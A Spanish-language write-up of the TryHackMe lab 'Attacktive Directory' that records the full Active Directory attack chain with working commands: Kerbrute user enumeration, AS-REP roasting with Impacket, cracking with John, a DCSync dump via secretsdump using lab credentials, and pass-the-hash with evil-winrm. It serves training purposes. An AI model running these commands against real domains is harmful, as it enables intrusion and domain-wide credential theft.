# Attacktive Directory

Este repositorio contiene la documentación de la metodología, comandos y notas recopiladas durante la explotación de la máquina **Attacktive Directory** de TryHackMe.

---

# 1. Metodología Aplicada

```text
[1. Reconocimiento / Enumeración]  
                 │  
                 ▼  
[2. Explotación Inicial (AS-REP Roasting)]  
                 │  
                 ▼  
[3. Cracking de Hashes de Red]  
                 │  
                 ▼  
[4. Movimiento Lateral (WinRM)]  
                 │  
                 ▼  
[5. Enumeración de Privilegios / DCSync]  
                 │  
                 ▼  
[6. Post-Explotación (Pass-the-Hash)]
```

## Reconocimiento y Enumeración de Usuarios

Descubrimiento del dominio base `spookysec.local` e identificación de nombres de usuario válidos mediante Kerberos.

## Acceso Inicial / Explotación

Abuso de la falta de preautenticación Kerberos (**AS-REP Roasting**) en cuentas específicas.

## Cracking de Credenciales

Ataque de diccionario contra los hashes de Kerberos recuperados.

## Persistencia y Elevación de Privilegios

Uso de credenciales comprometidas para consultar y simular funciones de replicación del Controlador de Dominio (**DCSync**).

## Post-Explotación

Acceso total al sistema utilizando técnicas de **Pass-the-Hash (PtH)**.

---

# 2. Comandos Utilizados

## Fase 1: Enumeración de Usuarios (Kerbrute)

```bash
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64  
chmod +x kerbrute_linux_amd64  

./kerbrute_linux_amd64 userenum -d spookysec.local --dc spookysec.local userlist.txt
```

## Fase 2: Ataque AS-REP Roasting (Impacket)

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ \  
-usersfile usuarios_validos.txt \  
-no-pass \  
-dc-ip 10.129.165.241
```

## Fase 3: Cracking de Hashes (John the Ripper)

```bash
john --wordlist=passwordlist.txt hash.txt
```

## Fase 4: DCSync / Secretsdump

```bash
python3 /opt/impacket/examples/secretsdump.py \  
spookysec.local/svc-admin:management2005@10.129.165.241
```

## Fase 5: Pass-the-Hash (Evil-WinRM)

```bash
evil-winrm -i 10.129.165.241 \  
-u 'Administrator' \  
-H '0e0363213e37b94221497260b0bcb4fc'
```

---

# 3. Notas Técnicas y Hallazgos

>
> [!NOTE]
> Las herramientas de Active Directory requieren resolución DNS explícita:
>
>
>
> 
```text
> 10.129.165.241    spookysec.local
```

## Vulnerabilidades Explotadas

### AS-REP Roasting (`svc-admin`)

La cuenta de servicio presentaba el atributo **DONT_REQ_PREAUTH**, permitiendo solicitar tickets AS-REP y realizar el descifrado offline.

### Abuso de Replicación de Directorio (DRSUAPI)

`secretsdump.py` utiliza la API DRSUAPI para simular un controlador de dominio secundario y obtener los hashes almacenados en `NTDS.dit`.

### Estructura del Hash Extraído

**Hash LM:**

```text
aad3b435b51404eeaad3b435b51404ee
```

**Hash NTLM:**

```text
0e0363213e37b94221497260b0bcb4fc
```

---

# Resumen del Ataque

```text
Enumeración de usuarios  
        ↓  
AS-REP Roasting  
        ↓  
Cracking de credenciales  
        ↓  
Obtención de cuenta privilegiada  
        ↓  
DCSync / Secretsdump  
        ↓  
Obtención de hashes NTLM  
        ↓  
Pass-the-Hash  
        ↓  
Compromiso total del Dominio
```

 
